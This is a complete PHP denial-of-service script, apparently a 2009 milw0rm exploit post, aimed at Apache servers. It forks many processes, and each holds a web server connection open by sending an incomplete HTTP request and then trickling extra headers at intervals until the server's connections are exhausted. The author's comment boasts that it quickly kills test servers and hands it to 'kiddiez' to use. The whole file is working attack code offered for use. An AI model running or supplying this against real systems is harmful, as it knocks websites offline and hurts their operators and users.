<?php
/*
    DOS for the vulnerbility at http://isc.sans.org/diary.html?storyid=6601
   

    I wrote it in PHP because I find it funny to make PHP attack apache...
    I set it at 200 processes and it kill my test servers pretty quick. have fun kiddiez...

    greetz: m1m1, t4dp0le, p00kiep0x, global hell [gH], b4b0, ri0t, JxT, bastard labs, neonfreon and everyone else you know who you are.....
    --evilrabbi b4b0
*/
/**
 * Usage function...
 *
 * @param $argv array
 * @return void
 */
function usage($argv)
{
    print "Usage: php ./{$argv[0]} <number of processes> <webserver ip or hostname>\n";
    die();
}

/**
 * Hangs the connection to the webserver
 *
 * @param $server string
 * @return void
 */
function killTheFucker($server)
{
    $request  = "GET / HTTP/1.1\r\n";
    $request .= "Host: {$server}\r\n";
    $request .= "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\r\n";
    $request .= "Content-Length: " . rand(1, 1000) . "\r\n";
    $request .= "X-a: " . rand(1, 10000) . "\r\n";

    $sockfd = @fsockopen($server, 80, $errno, $errstr);
    @fwrite($sockfd, $request);

    while((fwrite($sockfd, "X-c:" . rand(1, 10000) . "\r\n")) !== FALSE)
    {
        sleep(15);
    }
   
   
}

/**
 * main function
 * @param $argc int
 * @param $argv array
 * @return void
 */
function main($argc, $argv)
{
    $status = 1;

    if ($argc < 3)
    {
        usage($argv);
    }

    $pids = Array();

    for ($i = 0; $i < $argv[1]; $i++)
    {
        $pid = pcntl_fork();

        if ($pid == -1)
        {
            die("ERROR!@# YOU MADE BABY JESUS CRY");
        }
        else if ($pid == 0)
        {
            killTheFucker($argv[2]);
            exit(0);
        }
        else
        {
            $pids[] = $pid;
        }
    }

    foreach ($pids as $pid)
    {
        pcntl_waitpid($pid, $status);
    }
}

// fire everything up
main($argc, $argv);

# milw0rm.com [2009-06-22]